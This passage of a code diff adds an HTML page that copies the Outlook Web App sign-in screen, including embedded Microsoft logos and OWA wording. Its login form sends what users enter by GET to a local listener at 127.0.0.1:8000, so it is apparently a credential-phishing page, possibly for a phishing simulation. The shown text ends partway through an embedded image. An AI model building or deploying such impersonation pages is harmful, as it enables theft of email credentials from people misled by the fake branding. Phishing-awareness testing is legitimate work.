+    style="background: #f2f2f2 url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAoAAANvCAYAAADk40vJAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAA+VpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMC1jMDYwIDYxLjEzNDc3NywgMjAxMC8wMi8xMi0xNzozMjowMCAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczpkYz0iaHR0cDovL3B1cmwub3JnL2RjL2VsZW1lbnRzLzEuMS8iIHhtbG5zOnhtcE1NPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvbW0vIiB4bWxuczpzdFJlZj0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL3NUeXBlL1Jlc291cmNlUmVmIyIgeG1wOkNyZWF0b3JUb29sPSJBZG9iZSBQaG90b3Nob3AgQ1M1IFdpbmRvd3MiIHhtcDpDcmVhdGVEYXRlPSIyMDEyLTA1LTE1VDEzOjEwOjU5LTA3OjAwIiB4bXA6TW9kaWZ5RGF0ZT0iMjAxMi0wNS0xNVQxMzoxMTo0Ni0wNzowMCIgeG1wOk1ldGFkYXRhRGF0ZT0iMjAxMi0wNS0xNVQxMzoxMTo0Ni0wNzowMCIgZGM6Zm9ybWF0PSJpbWFnZS9wbmciIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6MzI2NTAzNjQ5RUNBMTFFMUFBNkRCNDc2QzU0RjhERUYiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6MzI2NTAzNjU5RUNBMTFFMUFBNkRCNDc2QzU0RjhERUYiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDozMjY1MDM2MjlFQ0ExMUUxQUE2REI0NzZDNTRGOERFRiIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDozMjY1MDM2MzlFQ0ExMUUxQUE2REI0NzZDNTRGOERFRiIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PnYK5fsAAAFLSURBVHja7NthDoIwDAZQNN7/vCTKKifQgZh12yPx30uG/bqyGLyt6xpLxXVfKi8QBEEQBEEQBEEQBEEQBEEQBEEQBEEQBEEQBEEQBMFh4WP/ePUSBEEQBEHQIQ4EQRA0cUHQdgVBe0Z5QN0Dalx1lAwoGcmAklEeyShP2/I8QlNoCuWRzJXlCeXRuGfvMSSjcX1rjat7NK6llUcyyqM8kvlh6X3dIhmNe2pp5ZGMpQ8nE8qT9R6LZFLeY0xYHnvm69G1h/NjmXJpjWukSGa4ZGIzUpI+C3vYMzM+C6Nu6XmH/XwjpZc9I5mkwz6K8iRtXMlI5mwy0TKZV/Zhf/kZd6g903akxJyN28Ow3ySTdKQ0SyZajpRyKfzPr1wNG3czUj5t1x6G/TbhSKlMZqiRcuhk365xI/2wj6aN+0y+Z25R98LQWH8QeQswAHk7x/k/TxxLAAAAAElFTkSuQmCC') repeat-x" />
+
+
+<script type="text/javascript">
+    RndMimeCtl();
+</script>
+
+
+<noscript>
+    <div id="dvErr">
+        <table cellpadding="0" cellspacing="0">
+            <tr>
+                <td><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAptJREFUeNqkU01LVFEYfu7XzJ17nZmyJBW0sgRDRAgLoi8tghZG9QNaR7tg2vQjbCu2a9Eq2qRGUYFBZAtLURzSUUcJG8d0ZnTu99fpPdIMSktfOOfcezjP8z7vc94jMMZwmJD5JAhCfWPm0e2+MGKDYRQNBCHrpTWi/1kaExFjY7defp6qneXJhb3pHwGBH4qy8uSIrp9NqjJ0TXsXuvZ0KfvjacEVsIlEzhXkofuvJ0f+I+BgVdOftfZe0OIsQBBTFxLX7raxCIH75vn3xOjwQDbQsSgfNw0pkXkwPjXCsWJNNjFlmttPaWrqKBBTEb9yr0No7tCEptaU3H3xMgQJp90imo2C7plGZvhmbx/H7hHwmnUJnWpjI8L1ZSg7fyBoSQWUHo4FIabFwEJE5HeLX4JmVzqrtjdYN5GM6k95FlhpE4q5A8GzEWzkITYkKYWEqLgG+C58IgiIMx1WkfX0/joBud2Tsrco+wokZ5dAIsL5Scgnu8ACH/7qTyL14RDYo/NJZqPq+D37FYDtlqHlp6n+xF7WYHkO8ZBkE6G9tgQ3BCwabsTdBwzbw34P5oohfZaKwHYB2CrA+bWCyKwgyC/AIU+qnIDAAYE3PAmG48/tU8Am1uXU9XR1A4rrQ6S2iHwP9pe3dIc2/OouTCLgJfBYNCVYrj9RV8A7rCIncwvSMWz5JIDUyW2dkXr1DmKnzxFBuVwDZw0JMxXkLC8YqxPw9vSk2NC62mQui2mUA9rsvpSX0o1+vL2r7InxFzXwp03R/G1GQx9Na6pOwIO3p6U0ZFbjLbl56QRY9tsZbyU7W/jwalyKq4/fb6sYLSq5JUPIfA28kRruwFvgwTuMNwmNG3RV58ntkAyb5jVz2bXMB97CYeKvAAMACjWGjcO+NcIAAAAASUVORK5CYII="
+                        alt=""></td>
+                <td style="width:100%">To use Outlook, browser settings must allow scripts to run. For information about
+                    how to allow scripts, consult the Help for your browser. If your browser doesn&#39;t support
+                    scripts, you can download <a
+                        href="https://go.microsoft.com/fwlink/?linkid=2009667&clcid=0x409">Windows Internet Explorer</a>
+                    for access to Outlook.</td>
+            </tr>
+        </table>
+    </div>
+</noscript>
+
+<form action="http://127.0.0.1:8000" method="GET" name="logonForm" ENCTYPE="application/x-www-form-urlencoded"
+    autocomplete="off">
+
+    <!-- Default to mouse class, so that things don't look wacky if the script somehow doesn't apply a class -->
+    <div id="mainLogonDiv" class="mouse">
+        <script>
+
+            var mainLogonDiv = window.document.getElementById("mainLogonDiv");
+            mainLogonDiv.className = mainLogonDivClassName;
+        </script>
+        <div class="sidebar">
+            <div class="owaLogoContainer">
+                <img src="data:image/png;base64,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"
+                    class="owaLogo" aria-hidden="true" />
+                <img src="data:image/png;base64,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"
+                    class="owaLogoSmall" aria-hidden="true" />
+            </div>
+        </div>
+        <div class="logonContainer">
+            <div id="lgnDiv" class="logonDiv" onKeyPress="return checkSubmit(event)">
+
+                <div class="signInImageHeader" role="heading" aria-label="Outlook">
+                    <img class="mouseHeader"
+                        src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAABMCAYAAADX/oqbAAAACXBIWXMAABYlAAAWJQFJUiTwAAA3X0lEQVR4Xu1dBWAURxeec9e4C0nQCKS4uxQpDkWKFvq3UGhpgdJCHdfi1uIUlyLFCRAICYQQ4glxu+SSy7nf/2bDQYAAaYuEdgeOkL3d2Zlvdr59Nm8QIguJAIkAiQCJAIkAiQCJAIkAiQCJAIkAiQCJAIkAiQCJAIlA7UaAUrub92pbF6/IDrohu9f5Ttn95mnqvNAURUGYUi9DFBtCFAoFwY+HxWazoUqw4CiVhgQcR2s9gUdUA7F3TJg0MLqDS8gZH75L8attMVk7icB/G4H/DGFdLIxtuzz56NyzWee76EoSEKJzEGLxgX8Y8H86kBB8EA3+wsdmgQ8QE/GxVv7+sABkQGbIis+Bj8VU+bEZENIrie88g/raPqvXf9YIv47bXDhSksT+23OM7P1LROBfSVjlehXrviqv0cKUw/NOJezvoyq/D+QkRIjrhBCDC6QCpGQBgiGkJSAs+LCAsHhUCmLZqAixhYjH4OgEdK5C